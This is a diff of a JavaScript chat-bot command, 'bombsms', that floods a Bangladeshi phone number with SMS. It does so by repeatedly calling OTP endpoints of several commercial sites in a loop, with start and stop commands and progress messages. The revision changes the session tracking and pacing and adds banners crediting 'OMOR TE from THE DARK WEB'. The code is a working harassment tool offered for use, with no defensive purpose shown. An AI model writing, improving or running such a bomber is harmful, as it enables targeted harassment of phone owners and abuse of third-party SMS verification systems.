@@ -1,20 +1,22 @@
 const axios = require("axios");
 
+// Sleep function
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-const activeBombings = {}; // Track all active bombings with their progress messages
+// Global bombing flags
+const bombingFlags = {};
 
 module.exports = {
   config: {
     name: "bombsms",
     version: "3.0.0",
-    author: "OMOR TE",
+    author: "OMOR TE from THE DARK WEB",
     countDown: 0,
     role: 2,
     shortDescription: "SMS Bomber",
-    longDescription: "SMS bombing tool - Multiple numbers supported",
+    longDescription: "SMS bombing tool (use at your own risk)",
     guide: "{p}bombsms 01xxxxxxxxx limit | {p}bombsms off",
     category: "tool"
   },
@@ -22,26 +24,12 @@ module.exports = {
   onStart: async function ({ message, event, args, api }) {
     const threadID = event.threadID;
     
-    // GLOBAL OFF - সব বন্ধ করবে
     if (args[0] === "off") {
-      let count = 0;
-      for (const key in activeBombings) {
-        if (activeBombings[key].active === true) {
-          activeBombings[key].active = false;
-          count++;
-          // Update progress message to stopped
-          try {
-            await api.editMessage(
-              `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${activeBombings[key].number}\n📊 ${activeBombings[key].sent}/${activeBombings[key].limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
-              activeBombings[key].messageID
-            );
-          } catch(e) {}
-        }
-      }
-      if (count > 0) {
-        return message.reply(`✅ **${count}** টি বোম্বিং বন্ধ করা হয়েছে।`);
+      if (bombingFlags[threadID]) {
+        bombingFlags[threadID] = false;
+        return message.reply("✅ SMS বোম্বার বন্ধ করা হয়েছে।");
       } else {
-        return message.reply("❗ কোনো বোম্বিং চলছিল না।");
+        return message.reply("❗এই থ্রেডে কোন বোম্বিং চলছিল না।");
       }
     }
 
@@ -49,11 +37,37 @@ module.exports = {
     const limitInput = args[1];
     
     if (!num || !limitInput) {
-      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📌 ব্যবহার: bombsms 01xxxxxxxxx 50\n📌 একাধিক: প্রতিটি কমান্ড আলাদাভাবে\n📌 বন্ধ: bombsms off (সব বন্ধ হবে)\n━━━━━━━━━━━━━━━━━━━━\n⚠️ শুধু মজার জন্য ব্যবহার করুন`);
+      const logo = `•┄┅════❁🌺❁════┅┄•
+
+██████╗░░█████╗░░░░░░░██████╗░░░░░█████╗░
+██╔══██╗██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
+██████╦╝██║░░╚═╝█████╗░░███╔═╝░░░██║░░██║
+██╔══██╗██║░░██╗╚════╝██╔══╝░░░░░██║░░██║
+██████╦╝╚█████╔╝░░░░░░███████╗██╗╚█████╔╝
+╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░
+
+××××××××××××××××××××××××××××××××××××××××××××
+DEVELOPER : OMOR TE
+GITHUB    : ...
+VERSION   : 1.0
+PROJECT   : SMS BOMBER 
+FACEBOOK  : Omor TE
+××××××××××××××××××××××××××××××××××××××××××××
+
+ব্যবহার:
+/bombsms 01xxxxxxxxx limit
+
+উদাহরণ: /bombsms 01712345678 50
+
+(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)
+বন্ধ করতে: /bombsms off
+
+•┄┅════❁🌺❁════┅┄•`;
+      return message.reply(logo);
     }
     
     if (!/^01[0-9]{9}$/.test(num)) {
-      return message.reply("❌ সঠিক বাংলাদেশি নাম্বার দিন (01xxxxxxxxx)");
+      return message.reply("❌ সঠিক বাংলাদেশি নাম্বার দিন (01xxxxxxxxx ফরম্যাটে)");
     }
     
     const limit = parseInt(limitInput);
@@ -61,28 +75,17 @@ module.exports = {
       return message.reply("❌ সঠিক সংখ্যা দিন (যেমন: 50)");
     }
     
-    // Unique ID for this bombing session
-    const sessionId = `${Date.now()}_${num}`;
-    
-    // Send start message with 0%
-    const progressBar0 = getProgressBar(0, 20);
-    const progressMsg = await message.reply(`🚀 **SMS BOMBER #${Object.keys(activeBombings).length + 1}**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n${progressBar0}\n━━━━━━━━━━━━━━━━━━━━\n⚡ ফাস্ট মোড\n⏳ শুরু হচ্ছে...`);
-    
-    // Store bombing info
-    activeBombings[sessionId] = {
-      active: true,
-      number: num,
-      limit: limit,
-      sent: 0,
-      messageID: progressMsg.messageID,
-      threadID: threadID
-    };
-    
-    let sent = 0;
-    let consecutiveFailures = 0;
-    let lastUpdatePercent = -1; // Start at -1 so 0% will update
+    if (bombingFlags[threadID]) {
+      return message.reply("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /bombsms off");
+    }
 
-    // API configs
+    message.reply(`✅ SMS বোম্বিং শুরু হয়েছে ${num} নম্বরে...
+লক্ষ্য: ${limit} SMS
+বন্ধ করতে /bombsms off`);
+
+    bombingFlags[threadID] = true;
+
+    // All headers and configurations from original - unchanged
     const headers = {
       'authority': 'www.bioscopelive.com',
       'accept': '*/*',
@@ -263,8 +266,10 @@ module.exports = {
     
     const url10 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0" + num;
     
+    // Convert cookies object to cookie string
     const cookieString = Object.entries(cookies9).map(([key, value]) => `${key}=${value}`).join('; ');
     
+    // Define all API calls
     const apiCalls = [
       async () => await axios.get(url1, { headers: headers }),
       async () => await axios.post(url2, data1, { headers: headers2 }),
@@ -281,88 +286,72 @@ module.exports = {
       async () => await axios.get(url10, { headers: headers10 })
     ];
     
-    // FAST BOMBING LOOP
-    (async () => {
-      while (sent < limit && activeBombings[sessionId]?.active === true) {
-        let cycleSuccess = false;
+    // Start bombing
+    (async function startBombing() {
+      let ses = 0;
+      let lastUpdate = 0;
+      let consecutiveFailures = 0;
+      
+      while (ses < limit && bombingFlags[threadID]) {
+        let cycleSuccessCount = 0;
         
-        for (let i = 0; i < apiCalls.length && sent < limit && activeBombings[sessionId]?.active === true; i++) {
+        for (let i = 0; i < apiCalls.length && ses < limit && bombingFlags[threadID]; i++) {
           try {
             const response = await apiCalls[i]();
             if (response && (response.status === 200 || response.status === 201)) {
-              sent++;
-              cycleSuccess = true;
+              ses += 1;
+              cycleSuccessCount += 1;
               consecutiveFailures = 0;
               
-              // Update activeBombings
-              if (activeBombings[sessionId]) {
-                activeBombings[sessionId].sent = sent;
-              }
-              
-              // Calculate percentage
-              const newPercent = Math.floor((sent / limit) * 100);
-              
-              // Update progress at 0%, 1%, 25%, 50%, 75%, 100%
-              if (newPercent !== lastUpdatePercent && (newPercent === 0 || newPercent === 1 || newPercent === 25 || newPercent === 50 || newPercent === 75 || newPercent === 100 || sent === limit)) {
-                lastUpdatePercent = newPercent;
-                const progressBar = getProgressBar(newPercent, 20);
-                const activeCount = Object.keys(activeBombings).length;
-                
-                let statusText = "";
-                if (sent >= limit) {
-                  statusText = "✅ সম্পন্ন!";
-                } else if (newPercent === 0) {
-                  statusText = "⏳ শুরু হচ্ছে...";
-                } else {
-                  statusText = "⚡ ফাস্ট মোড";
-                }
-                
-                try {
-                  await api.editMessage(
-                    `🚀 **SMS BOMBER #${activeCount}**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${newPercent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n${statusText}`,
-                    progressMsg.messageID
-                  );
-                } catch(e) {}
+              if (ses - lastUpdate >= 5 || ses <= 5) {
+                api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
+                lastUpdate = ses;
               }
             }
           } catch (error) {
-            consecutiveFailures++;
+            consecutiveFailures += 1;
           }
           
-          // Super fast: 80ms delay
-          await sleep(80);
+          await sleep(500);
+          if (!bombingFlags[threadID]) break;
+        }
+        
+        if (cycleSuccessCount === 0) {
+          consecutiveFailures += 1;
+          await sleep(2000 * Math.min(consecutiveFailures, 10));
           
-          if (!activeBombings[sessionId]?.active) break;
+          if (consecutiveFailures >= 5) {
+            api.sendMessage(`⚠️ APIs may be rate limiting. Continuing with longer delays... Current: ${ses}/${limit}`, threadID);
+            consecutiveFailures = 0;
+          }
+        } else {
+          consecutiveFailures = 0;
+          await sleep(1000);
         }
-        
-        if (!cycleSuccess) {
-          consecutiveFailures++;
-          await sleep(300);
-        }
-        
-        if (consecutiveFailures > 60) {
-          try {
-            await api.editMessage(
-              `⚠️ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit reached\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━`,
-              progressMsg.messageID
-            );
-          } catch(e) {}
-          break;
-        }
-        
-        await sleep(150);
       }
       
-      // Cleanup
-      if (activeBombings[sessionId]) {
-        delete activeBombings[sessionId];
+      if (bombingFlags[threadID]) {
+        bombingFlags[threadID] = false;
+        const completionMessage = `🎯 SMS বোম্বিং সম্পূর্ণ হয়েছে!
+
+      ____  ____  _  ________
+     / __ \\/ __ \\/ | / / ____/
+    / / / / / / /  |/ / __/   
+   / /_/ / /_/ / /|  / /___   
+  /_____/\\____/_/ |_/_____/   
+                            
+ TNQ FOR USING OUR TOOLS 🖤🥰
+
+মোট পাঠানো SMS: ${ses}/${limit}
+লক্ষ্য নম্বর: ${num}
+
+Developer: OMOR TE from THE DARK WEB
+Team: MW LEGENDS`;
+        
+        api.sendMessage(completionMessage, threadID);
+      } else {
+        api.sendMessage(`⛔ SMS বোম্বিং বন্ধ করা হয়েছে।\nমোট পাঠানো SMS: ${ses}/${limit}`, threadID);
       }
     })();
   }
 };
-
-function getProgressBar(percent, width) {
-  const filled = Math.round((percent / 100) * width);
-  const empty = width - filled;
-  return `┣${"█".repeat(filled)}${"░".repeat(empty)}┫`;
-}
